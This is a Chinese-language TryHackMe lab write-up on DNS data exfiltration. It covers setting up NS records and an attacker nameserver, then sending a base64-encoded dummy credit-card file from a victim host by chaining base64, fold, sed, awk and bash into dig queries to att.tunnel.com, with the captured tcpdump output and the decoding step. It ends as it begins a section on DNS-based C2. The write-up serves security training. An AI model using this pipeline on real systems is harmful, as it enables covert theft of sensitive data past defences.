<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009674.png" alt></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009675.png" alt></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009676.png" alt></p>
<h1 id="0x08-dns-配置">0x08 DNS 配置</h1>
<p>通过DNS协议进行渗透，需要控制域名并设置DNS记录，包括NS、A或TXT。因此，我们提供了一个Web界面，方便您添加和修改DNS记录。以下域名已设置并准备好执行 DNS 渗透任务：<a target="_blank" rel="noopener" href="http://tunnel.com">tunnel.com</a>.</p>
<p>要访问该网站，您可以访问以下链接：<a target="_blank" rel="noopener" href="http://10.10.41.88/">http://10.10.41.88/</a> 或 <a target="_blank" rel="noopener" href="https://10-10-41-88.p.thmlabs.com/">https://10-10-41-88.p.thmlabs.com/</a> 无需 VPN。<br>
<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009677.png" alt></p>
<p>选择域名后，您可以添加 DNS 记录并测试并在出现问题时重置 DNS 配置.</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009678.png" alt></p>
<h2 id="新攻击机">新攻击机</h2>
<p>请注意，我们在网络 2 中添加了一台新的攻击者机器，该机器具有以下子域名和 IP 地址：</p>
<table>
<thead>
<tr>
<th>**Domain Name&nbsp;**</th>
<th><strong>IP Address</strong></th>
<th><strong>Network Access</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><a target="_blank" rel="noopener" href="http://attacker.thm.com">attacker.thm.com</a></td>
<td>172.20.0.200</td>
<td>Network 2</td>
</tr>
</tbody>
</table>
<p>我们将使用攻击者机器在 DNS 和 DNS 隧道场景中进行渗透。主要目标是攻击者机器（在 Network2 上）可以通过 JumpBox 访问网络 1 的内部网络设备。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009679.png" alt></p>
<h2 id="用于-dns-渗透的名称服务器">用于 DNS 渗透的名称服务器</h2>
<p>为了在所提供的网络或互联网上成功执行 DNS 渗透，我们需要为我们控制的域名设置一个名称服务器，如下所示：</p>
<ol>
<li>添加指向 AttackBox 的 IP 地址的 A 记录。例如，<strong>A</strong>, Subdomain Name:&nbsp;<strong>t1ns</strong>, Value:&nbsp;<strong>AttackBox_IP</strong>.</li>
<li>添加一条 NS 记录，将 DNS 查询路由到步骤 1 中的 A 记录。例如，Type：NS, Subdomain Name:&nbsp;t1, Value:&nbsp;<a target="_blank" rel="noopener" href="http://t1ns.tunnel.com">t1ns.tunnel.com</a>.</li>
</ol>
<p>确保我们为 NS 值指定完整域名：<a target="_blank" rel="noopener" href="http://t1ns.tunnel.com">t1ns.tunnel.com</a>。添加两条记录后，名称服务器 <a target="_blank" rel="noopener" href="http://t1.tunnel.com">t1.tunnel.com</a> 就可以用于 DNS 过滤目的。</p>
<p>如果您选择不设置 AttackBox，我们会在我们提供的网络中为攻击者计算机设置一个名称服务器，并且可以按如下方式使用：</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009680.png" alt></p>
<p>请注意，<a target="_blank" rel="noopener" href="http://attNS.thm.com">attNS.thm.com</a> IP 地址指向我们网络中新添加的攻击者计算机，并且它已准备好在我们的环境中 JumpBox 和攻击者之间用于 DNS 任务和目的。</p>
<h2 id="实验室建议">实验室建议</h2>
<p>尽管您可以在该房间中使用 AttackBox，但我们建议对大多数部分（TCP、SSH、ICMP、DNS）使用 JumpBox，以避免 DNS 和网络方面的技术问题。如果您更喜欢使用 AttackBox 执行 DNS 隧道任务（任务 10），则必须将 AttackBox 的 DNS 设置更改为 10.10.41.88 有多种方法可以更改 AttackBox 计算机中的 DNS 设置。然而，以下是我们为我们的环境找到的稳定解决方案之一。</p>
<p>首先，我们需要编辑 Yaml Netplan 配置文件。</p>
<pre><code class="hljs scss">root<span class="hljs-keyword">@AttackBox</span>:~# nano /etc/netplan/aws-vmimport-netplan.yaml</code></pre>
<p>修改Netplan配置文件，在eth0接口下添加nameserver部分，如下：</p>
<pre><code class="hljs yaml"><span class="hljs-comment"># Automatically generated by the vm import process</span>
 <span class="hljs-attr">network:</span>
     <span class="hljs-attr">ethernets:</span>
         <span class="hljs-attr">eth0:</span>
             <span class="hljs-attr">dhcp4:</span> <span class="hljs-literal">true</span>
             <span class="hljs-attr">optional:</span> <span class="hljs-literal">false</span>
             <span class="hljs-attr">nameservers:</span>
                <span class="hljs-attr">search:</span> [<span class="hljs-string">tunnel.com</span>]
                <span class="hljs-attr">addresses:</span> [<span class="hljs-number">10.10</span><span class="hljs-number">.41</span><span class="hljs-number">.88</span>]
         <span class="hljs-attr">ens5:</span>
             <span class="hljs-attr">dhcp4:</span> <span class="hljs-literal">true</span>
             <span class="hljs-attr">optional:</span> <span class="hljs-literal">false</span>
     <span class="hljs-attr">version:</span> <span class="hljs-number">2</span></code></pre>
<p>最后，应用 Netplan 更改（这可能需要运行两次）。</p>
<pre><code class="hljs markup">root@AttackBox:~# netplan apply</code></pre>
<h2 id="dns测试">DNS测试</h2>
<p>一旦您可以访问 Jump 机器，您需要通过如下测试来确保 DNS 正常工作：</p>
<pre><code class="hljs scss">thm<span class="hljs-keyword">@jump-box</span>:~$ dig +short test.thm.com
<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>
thm<span class="hljs-keyword">@jump-box</span>:~$ ping test.thm.com -c <span class="hljs-number">1</span>
PING test.thm.com (<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>) <span class="hljs-number">56</span>(<span class="hljs-number">84</span>) bytes of data.
<span class="hljs-number">64</span> bytes from localhost (<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>): icmp_seq=<span class="hljs-number">1</span> ttl=<span class="hljs-number">64</span> time=<span class="hljs-number">0.018</span> ms

--- test.thm.com ping statistics ---
<span class="hljs-number">1</span> packets transmitted, <span class="hljs-number">1</span> received, <span class="hljs-number">0%</span> packet loss, time <span class="hljs-number">0ms</span>
rtt min/avg/max/mdev = <span class="hljs-number">0.018</span>/<span class="hljs-number">0.018</span>/<span class="hljs-number">0.018</span>/<span class="hljs-number">0.000</span> ms</code></pre>
<p>DNS 服务器必须将 <a target="_blank" rel="noopener" href="http://test.thm.com">test.thm.com</a> 和 <a target="_blank" rel="noopener" href="http://test.tunnel.com">test.tunnel.com</a> 域名解析为 127.0.0.1，确认您已准备就绪。</p>
<pre><code class="hljs scss">thm<span class="hljs-keyword">@jump-box</span>:/tmp$ dig +short test.thm.com
<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>
thm<span class="hljs-keyword">@jump-box</span>:/tmp$ dig +short flag.thm.com
<span class="hljs-number">172.20</span>.<span class="hljs-number">0.120</span>
thm<span class="hljs-keyword">@jump-box</span>:/tmp$</code></pre>
<h1 id="0x09-用-dns-进行渗透">0x09 用 DNS 进行渗透</h1>
<p>DNS 协议是一种通用协议，其主要目的是将域名解析为 IP 地址，反之亦然。尽管 DNS 协议不是为传输数据而设计的，但威胁参与者找到了一种滥用和通过其移动数据的方法。此任务展示了一种通过 DNS 协议窃取数据的技术。</p>
<h2 id="什么是-dns-数据渗透">什么是 DNS 数据渗透</h2>
<p>由于 DNS 不是传输协议，因此许多组织不会定期监控 DNS 协议！任何组织网络中的几乎所有防火墙都允许使用 DNS 协议。出于这些原因，威胁行为者更喜欢使用 DNS 协议来隐藏他们的通信。</p>
<p>DNS 协议有需要考虑的局限性，如下所示：</p>
<ul>
<li>完全限定 FQDN 域名（包括 .分隔符）的最大长度为 255 个字符。</li>
<li>子域名（标签）长度不得超过63个字符（<a target="_blank" rel="noopener" href="http://xn--ihqy4j77p.com">不包括.com</a>、.net等）。</li>
</ul>
<p>基于这些限制，我们可以使用有限数量的字符通过域名传输数据。如果我们有一个大文件，例如10 MB，可能需要超过50000个DNS请求才能完整传输该文件。因此，它将是嘈杂的交通，并且容易被注意到和检测。</p>
<p>现在我们来讨论一下通过DNS进行数据泄露的要求和步骤，如下：</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009682.png" alt></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009683.png" alt></p>
<ol>
<li>攻击者注册域名，<a target="_blank" rel="noopener" href="http://xn--tunnel-9v9ii49d.com">例如tunnel.com</a></li>
<li><a target="_blank" rel="noopener" href="http://xn--tunnel-2g3jp77db4sqh5d.com">攻击者将tunnel.com</a> 的NS 记录设置为指向攻击者控制的服务器。</li>
<li>恶意软件或攻击者将敏感数据从受害者计算机发送到他们控制的域名，例如 <a target="_blank" rel="noopener" href="http://passw0rd.tunnel.com">passw0rd.tunnel.com</a>，其中 passw0rd 是需要传输的数据。</li>
<li>DNS请求通过本地DNS服务器发送，并通过Internet转发。</li>
<li>攻击者的权威DNS（恶意服务器）收到DNS请求。</li>
<li>最后，攻击者从域名中提取密码。</li>
</ol>
<h2 id="什么时候需要使用-dns-数据过滤">什么时候需要使用 DNS 数据过滤？</h2>
<p>有许多用例场景，但典型的场景是防火墙阻止并过滤所有流量。我们可以使用 DNS 协议通过防火墙传递数据或 TCP/UDP 数据包，但重要的是要确保允许 DNS 并将域名解析为 IP 地址。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009684.png" alt></p>
<h2 id="修改dns记录">修改DNS记录！</h2>
<p>现在让我们尝试在提供的网络环境中执行 DNS 数据过滤。请注意，<a target="_blank" rel="noopener" href="http://xn--tunnel-9v7i24c2ybh68bxfaw08ct8sf5n2qrc10b.com">在此场景中我们将使用tunnel.com</a> 域名。我们还提供了一个 Web <a target="_blank" rel="noopener" href="http://xn--tunnel-2g0js76l6ce365bqm2f.com">界面来修改tunnel.com</a> 的 DNS 记录，以插入指向您的 AttackBox 计算机的名称服务器 (NS)。确保完成任务 8 中的这些设置。</p>
<h2 id="dns-数据泄露">DNS 数据泄露</h2>
<p>现在让我们解释手动 DNS 数据过滤技术并展示其工作原理。假设我们有包含敏感数据（例如信用卡信息）的 acreds.txt 文件。要通过 DNS 协议移动它，我们需要对文件的内容进行编码并将其附加为子域名，如下所示，</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009685.png" alt></p>
<ol>
<li>获取需要传输的所需数据。</li>
<li>使用其中一种编码技术对文件进行编码。</li>
<li>将编码字符作为子域/标签发送。</li>
<li>考虑 DNS 协议的限制。请注意，我们可以向域名添加尽可能多的数据，但整个 URL 必须保持在 255 个字符以内，每个子域标签不能超过 63 个字符。如果我们确实超出了这些限制，我们将分割数据并发送更多 DNS 请求！</li>
</ol>
<p>现在让我们尝试在提供的网络环境中执行 DNS 数据过滤技术。本节旨在将 creds.txt 文件的内容从受害者2传输到攻击者我们将使用 <a target="_blank" rel="noopener" href="http://att.tunnel.com">att.tunnel.com</a> 名称服务器，指向新添加的计算机（攻击者计算机）。</p>
<p>重要提示：您可以使用 AttackBox 来执行此任务，但请确保更新 DNS 记录并添加指向 AttackBox 的 IP 地址的 NS 记录，或使用攻击者计算机的预配置名称服务器 <a target="_blank" rel="noopener" href="http://att.tunnel.com">att.tunnel.com</a>。</p>
<p>首先要做的是让攻击者机器准备好接收任何 DNS 请求。让我们通过 SSH 连接到攻击者计算机，这可以使用以下凭据从 Jump Box 完成：thm:tryhackme.</p>
<pre><code class="hljs scss">thm<span class="hljs-keyword">@jump-box</span>$ ssh thm<span class="hljs-keyword">@attacker</span>.thm.com</code></pre>
<p>或者从 AttackBox 机器使用 10.10.41.88 和端口 2322，如下所示，</p>
<pre><code class="hljs scss">root<span class="hljs-keyword">@AttackBox</span>$ ssh thm@<span class="hljs-number">10.10</span>.<span class="hljs-number">41.88</span> -p <span class="hljs-number">2322</span></code></pre>
<p>为了接收任何 DNS 请求，我们需要使用 tcpdump 工具捕获任何传入 UDP/53 数据包的网络流量。</p>
<pre><code class="hljs scss">thm<span class="hljs-keyword">@attacker</span>$ sudo tcpdump -i eth0 udp port <span class="hljs-number">53</span> -v 
<span class="hljs-attribute">tcpdump</span>: listening on eth0, link-type RAW (Raw IP), snapshot length <span class="hljs-number">262144</span> bytes</code></pre>
<p>一旦攻击者机器准备就绪，我们就可以进入下一步，即通过 SSH 连接到受害者 2，这可以使用以下凭据从 Jump Box 完成：thm:tryhackme.</p>
<pre><code class="hljs scss">thm<span class="hljs-keyword">@jump-box</span>$ ssh thm<span class="hljs-keyword">@victim</span>2.thm.com</code></pre>
<p>或者从 AttackBox 机器使用 10.10.41.88 和端口 2122，如下所示，</p>
<pre><code class="hljs scss">root<span class="hljs-keyword">@AttackBox</span>$ ssh thm@<span class="hljs-number">10.10</span>.<span class="hljs-number">41.88</span> -p <span class="hljs-number">2122</span></code></pre>
<p>在victim2机器上，有一个包含虚拟数据的task9/credit.txt文件。</p>
<pre><code class="hljs scss">thm<span class="hljs-keyword">@victim</span>2$ cat task9/credit.txt
<span class="hljs-attribute">Name</span>: THM-user
<span class="hljs-attribute">Address</span>: <span class="hljs-number">1234</span> Internet, THM
Credit <span class="hljs-attribute">Card</span>: <span class="hljs-number">1234</span>-<span class="hljs-number">1234</span>-<span class="hljs-number">1234</span>-<span class="hljs-number">1234</span>
<span class="hljs-attribute">Expire</span>: <span class="hljs-number">05</span>/<span class="hljs-number">05</span>/<span class="hljs-number">2022</span>
<span class="hljs-attribute">Code</span>: <span class="hljs-number">1337</span></code></pre>
<p>为了发送文件的内容，我们需要将其转换为字符串表示形式，这可以使用任何编码表示形式（例如 Base64、十六进制、二进制等）来完成。在我们的示例中，我们使用 Base64 对文件进行编码，如下所示：</p>
<pre><code class="hljs scss">thm<span class="hljs-keyword">@victim</span>2$ cat task9/credit.txt | base64
TmFtZTogVEhNLXVzZXIKQWRkcmVzczogMTIzNCBJbnRlcm5ldCwgVEhNCkNyZWRpdCBDYXJkOiAx
MjM0LTEyMzQtMTIzNC0xMjM0CkV4cGlyZTogMDUvMDUvMjAyMgpDb2RlOiAxMzM3Cg==</code></pre>
<p>现在我们有了 Base64 表示形式，我们需要根据输出的长度（DNS 限制）将其拆分为一个或多个 DNS 请求，并将其附加为子域名。让我们从拆分多个 DNS 请求开始展示这两种方法。</p>
<pre><code class="hljs scss">thm<span class="hljs-keyword">@victim</span>2:~$ cat task9/credit.txt | base64 | tr -d <span class="hljs-string">"\n"</span>| fold -w18 | sed -r <span class="hljs-string">'s/.*/&amp;.att.tunnel.com/'</span> 
TmFtZTogVEhNLXVzZX.att.tunnel.com
IKQWRkcmVzczogMTIz.att.tunnel.com
NCBJbnRlcm5ldCwgVE.att.tunnel.com
hNCkNyZWRpdCBDYXJk.att.tunnel.com
OiAxMjM0LTEyMzQtMT.att.tunnel.com
IzNC0xMjM0CkV4cGly.att.tunnel.com
ZTogMDUvMDUvMjAyMg.att.tunnel.com
pDb2RlOiAxMzM3Cg==.att.tunnel.com

#tr -d <span class="hljs-string">"\n"</span>
#这里tr是unix/linux系统中的一个转换工具，可以实现删除、替换、压缩等字符串转换操作。
#-d 参数表示删除，<span class="hljs-string">"\n"</span> 表示换行符。
#所以整条命令的作用是:删除输入内容中的所有换行符，也就是将输入的多行文本压缩成一行。
#在上述示例中，我们先用base64对数据进行编码，然后再用tr -d <span class="hljs-string">"\n"</span>命令来删除编码后的换行符，这可以起到压缩数据，增加传输效率的目的。
#因为base64编码会让数据大小增大<span class="hljs-number">1</span>/<span class="hljs-number">3</span>，因此删除换行符可以缩小数据量，有利于数据传输，同时也增加了数据的混淆性，让查看者难以识别。

#fold -w18
#将编码后的字符串折行，每行<span class="hljs-number">18</span>个字符，以伪装成普通文本

#sed -r <span class="hljs-string">'s/.*/&amp;.att.tunnel.com/'</span>
#sed -r 表示使用扩展正则表达式，在Linux中，正则表达式可以分为基本正则表达式和扩展正则表达式。
#sed默认使用的是基础正则表达式，语法比较简单，只支持部分元字符和字符类，而扩展正则表达式(ERE)则支持更复杂和高级的正则语法。
#sed -r命令后面的格式是:s/正则表达式/替换字符串/
#其中：
#正则表达式部分:.*
#- .* 表示匹配输入行的全部内容
#替换字符串部分:&amp;.att.tunnel.com
#- &amp; 表示正则表达式匹配到的内容，即输入行的全部，后面添加了字符串att.tunnel.com</code></pre>
<p>在上一个命令中，我们读取文件的内容并使用 Base64 对其进行编码。然后，我们通过删除新行来清理字符串，并将每 18 个字符收集为一组。最后，我们为每个组附加了名称服务器“<a target="_blank" rel="noopener" href="http://att.tunnel.com">att.tunnel.com</a>”。</p>
<p>让我们检查一下发送单个 DNS 请求的另一种方式，我们将使用该方式进行数据泄露。这次，我们用点“.”分割每 18 个字符。并添加名称服务器，类似于我们在上一个命令中所做的操作。</p>
<pre><code class="hljs scss">thm<span class="hljs-keyword">@victim</span>2:~$ cat task9/credit.txt |base64 | tr -d <span class="hljs-string">"\n"</span> | fold -w18 | sed <span class="hljs-string">'s/.*/&amp;./'</span> | tr -d <span class="hljs-string">"\n"</span> | sed s/$/att.tunnel.com/
TmFtZTogVEhNLXVzZX.IKQWRkcmVzczogMTIz.NCBJbnRlcm5ldCwgVE.hNCkNyZWRpdCBDYXJk.OiAxMjM0LTEyMzQtMT.IzNC0xMjM0CkV4cGly.ZTogMDUvMDUvMjAyMg.pDb2RlOiAxMzM3Cg==.att.tunnel.com

#sed <span class="hljs-string">'s/.*/&amp;./'</span> 在每行末尾追加<span class="hljs-string">"."</span> 
#tr -d <span class="hljs-string">"\n"</span> 再次删除换行符，压缩数据 
#sed s/$/att.tunnel.com/ 在压缩后的字符串末尾追加<span class="hljs-string">"att.tunnel.com"</span> 
#此处使用了sed命令的替换功能，其中:s表示替换，$表示行尾。</code></pre>
<p>接下来，从victim2机器上，考虑DNS限制，我们将base64数据作为子域名发送，如下所示：</p>
<pre><code class="hljs scss">thm<span class="hljs-keyword">@victim</span>2:~$ cat task9/credit.txt |base64 | tr -d <span class="hljs-string">"\n"</span> | fold -w18 | sed <span class="hljs-string">'s/.*/&amp;./'</span> | tr -d <span class="hljs-string">"\n"</span> | sed s/$/att.tunnel.com/ | awk <span class="hljs-string">'{print "dig +short " $1}'</span> | bash

#awk <span class="hljs-string">'{print "dig +short " $1}'</span> | bash
#<span class="hljs-number">1</span>. awk <span class="hljs-string">'{print "dig +short " $1}'</span>
#- awk命令会对输入内容的每一行进行逐行处理
#- {print "dig +short " $<span class="hljs-number">1</span>} 是处理动作
<span class="hljs-selector-id">#-</span> 打印字符串 "dig +short "
<span class="hljs-selector-id">#-</span> 拼接当前行的第一个字段 $<span class="hljs-number">1</span>，也就是域名
<span class="hljs-selector-id">#-</span> 这样awk的输出就是一系列dig命令
<span class="hljs-selector-id">#2</span>. | bash
<span class="hljs-selector-id">#-</span> 使用管道将awk的输出作为bash命令来执行
<span class="hljs-selector-id">#3</span>. 这样就实现了:
#- awk自动提取域名，构造dig命令
#- bash执行这些命令，实现域名解析</code></pre>
<p>通过对单个 DNS 请求进行一些调整，我们创建并添加了 dig 命令以通过 DNS 发送它，最后，我们将其传递给 bash 来执行。如果我们检查攻击者的 tcpdump 终端，我们应该会收到从受害者 2 发送的数据</p>
<pre><code class="hljs scss">thm<span class="hljs-keyword">@attacker</span>:~$ sudo tcpdump -i eth0 udp port <span class="hljs-number">53</span> -v
<span class="hljs-attribute">tcpdump</span>: listening on eth0, link-type EN10MB (Ethernet), capture size <span class="hljs-number">262144</span> bytes
<span class="hljs-number">22</span>:<span class="hljs-number">14</span>:<span class="hljs-number">00.287440</span> IP (tos <span class="hljs-number">0</span>x0, ttl <span class="hljs-number">64</span>, id <span class="hljs-number">60579</span>, offset <span class="hljs-number">0</span>, flags [none], proto UDP (<span class="hljs-number">17</span>), length <span class="hljs-number">104</span>)
    <span class="hljs-number">172.20</span>.<span class="hljs-number">0.1</span>.<span class="hljs-number">56092</span> &gt; attacker.<span class="hljs-attribute">domain</span>: <span class="hljs-number">19543%</span> [<span class="hljs-number">1</span>au] A? _.pDb2RlOiAxMzM3Cg==.att.tunnel.com. (<span class="hljs-number">76</span>)
<span class="hljs-number">22</span>:<span class="hljs-number">14</span>:<span class="hljs-number">00.288208</span> IP (tos <span class="hljs-number">0</span>x0, ttl <span class="hljs-number">64</span>, id <span class="hljs-number">60580</span>, offset <span class="hljs-number">0</span>, flags [none], proto UDP (<span class="hljs-number">17</span>), length <span class="hljs-number">235</span>)
    <span class="hljs-number">172.20</span>.<span class="hljs-number">0.1</span>.<span class="hljs-number">36680</span> &gt; attacker.<span class="hljs-attribute">domain</span>: <span class="hljs-number">23460%</span> [<span class="hljs-number">1</span>au] A? TmFtZTogVEhNLXVzZX.IKQWRkcmVzczogMTIz.NCBJbnRlcm5ldCwgVE.hNCkNyZWRpdCBDYXJk.OiAxMjM0LTEyMzQtMT.IzNC0xMjM0CkV4cGly.ZTogMDUvMDUvMjAyMg.pDb2RlOiAxMzM3Cg==.att.tunnel.com. (<span class="hljs-number">207</span>)
<span class="hljs-number">22</span>:<span class="hljs-number">14</span>:<span class="hljs-number">00.289643</span> IP (tos <span class="hljs-number">0</span>x0, ttl <span class="hljs-number">64</span>, id <span class="hljs-number">48564</span>, offset <span class="hljs-number">0</span>, flags [DF], proto UDP (<span class="hljs-number">17</span>), length <span class="hljs-number">69</span>)
    attacker.<span class="hljs-number">52693</span> &gt; <span class="hljs-number">172.20</span>.<span class="hljs-number">0.1</span>.<span class="hljs-attribute">domain</span>: <span class="hljs-number">3567</span>+ PTR? <span class="hljs-number">1.0</span>.<span class="hljs-number">20.172</span>.in-addr.arpa. (<span class="hljs-number">41</span>)
<span class="hljs-number">22</span>:<span class="hljs-number">14</span>:<span class="hljs-number">00.289941</span> IP (tos <span class="hljs-number">0</span>x0, ttl <span class="hljs-number">64</span>, id <span class="hljs-number">60581</span>, offset <span class="hljs-number">0</span>, flags [DF], proto UDP (<span class="hljs-number">17</span>), length <span class="hljs-number">123</span>)
    <span class="hljs-number">172.20</span>.<span class="hljs-number">0.1</span>.domain &gt; attacker.<span class="hljs-number">52693</span>: <span class="hljs-number">3567</span> NXDomain* <span class="hljs-number">0</span>/<span class="hljs-number">1</span>/<span class="hljs-number">0</span> (<span class="hljs-number">95</span>)</code></pre>
<p>一旦收到我们的 DNS 请求，我们可以停止 tcpdump 工具并通过删除不需要的字符串来清理接收到的数据，最后使用 Base64 解码回数据，如下所示，</p>
<pre><code class="hljs scss"><span class="hljs-selector-id">#Cleaning</span> and Restoring the Receiving Data

thm<span class="hljs-keyword">@attacker</span>:~$ echo <span class="hljs-string">"TmFtZTogVEhNLXVzZX.IKQWRkcmVzczogMTIz.NCBJbnRlcm5ldCwgVE.hNCkNyZWRpdCBDYXJk.OiAxMjM0LTEyMzQtMT.IzNC0xMjM0CkV4cGly.ZTogMDUvMDUvMjAyMg.pDb2RlOiAxMzM3Cg==.att.tunnel.com."</span> | cut -d<span class="hljs-string">"."</span> -f1-<span class="hljs-number">8</span> | tr -d <span class="hljs-string">"."</span> | base64 -d
<span class="hljs-attribute">Name</span>: THM-user
<span class="hljs-attribute">Address</span>: <span class="hljs-number">1234</span> Internet, THM
Credit <span class="hljs-attribute">Card</span>: <span class="hljs-number">1234</span>-<span class="hljs-number">1234</span>-<span class="hljs-number">1234</span>-<span class="hljs-number">1234</span>
<span class="hljs-attribute">Expire</span>: <span class="hljs-number">05</span>/<span class="hljs-number">05</span>/<span class="hljs-number">2022</span>
<span class="hljs-attribute">Code</span>: <span class="hljs-number">1337</span>

#cut -d<span class="hljs-string">"."</span> -f1-<span class="hljs-number">8</span> | tr -d <span class="hljs-string">"."</span> | base64 -d

#cut -d<span class="hljs-string">"."</span> -f1-<span class="hljs-number">8</span>表示使用点号<span class="hljs-string">"."</span>作为分隔符，提取输入文本的前<span class="hljs-number">8</span>个字段。
#具体来说:
#- -d指定了分隔符为点号<span class="hljs-string">"."</span>
#- -f指定了要提取的字段，这里是<span class="hljs-number">1</span>-<span class="hljs-number">8</span>，即前<span class="hljs-number">8</span>个字段
#所以这条命令的作用就是:对于以点号分隔的输入文本，提取每行的前<span class="hljs-number">8</span>个字段（在上述示例中，前八个字段对应的是TmFtZTogVEhNLXVzZX.IKQWRkcmVzczogMTIz.NCBJbnRlcm5ldCwgVE.hNCkNyZWRpdCBDYXJk.OiAxMjM0LTEyMzQtMT.IzNC0xMjM0CkV4cGly.ZTogMDUvMDUvMjAyMg.pDb2RlOiAxMzM3Cg==）。

#tr -d <span class="hljs-string">"."</span> 表示删除输入内容中的所有<span class="hljs-string">"."</span>点符号

#base64 -d 表示对输入内容进行base64解码处理

#总结：通过cut、tr和base64三个命令的组合实现了分割，去点号和解码的效果</code></pre>
<p>好的！我们已成功通过 DNS 协议手动传输credit.txt 的内容。</p>
<h2 id="通过-dns-的-c2-通信">通过 DNS 的 C2 通信</h2>
<p>C2框架使用DNS协议进行通信，例如通过DNS协议发送命令执行请求和接收执行结果。他们还使用 TXT DNS 记录运行 dropper 在受害计算机上下载额外文件。本节模拟如何通过 DNS 协议执行 bash 脚本。我们将使用 Web 界面将 TXT DNS <a target="_blank" rel="noopener" href="http://xn--tunnel-or3j12aq05fpv4adk2e.com">记录添加到tunnel.com</a> 域名。</p>
